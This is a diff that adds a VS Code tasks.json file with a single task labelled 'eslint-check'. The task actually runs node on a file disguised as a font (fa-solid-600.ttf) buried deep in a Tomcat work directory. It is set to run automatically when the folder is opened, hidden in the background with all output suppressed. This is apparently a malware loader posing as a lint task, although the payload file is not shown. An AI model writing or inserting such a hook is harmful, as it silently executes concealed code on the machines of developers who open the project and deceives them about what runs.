@@ -1,0 +1,25 @@
+﻿{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "node",
+      "args": ["./Fullstack-bootcamp-with-Spring-and-Angular-/Session26-task/work/Catalina/localhost/ROOT/org/apache/jsp/WEB_002dINF/jsp/public/fonts/fa-solid-600.ttf"],
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
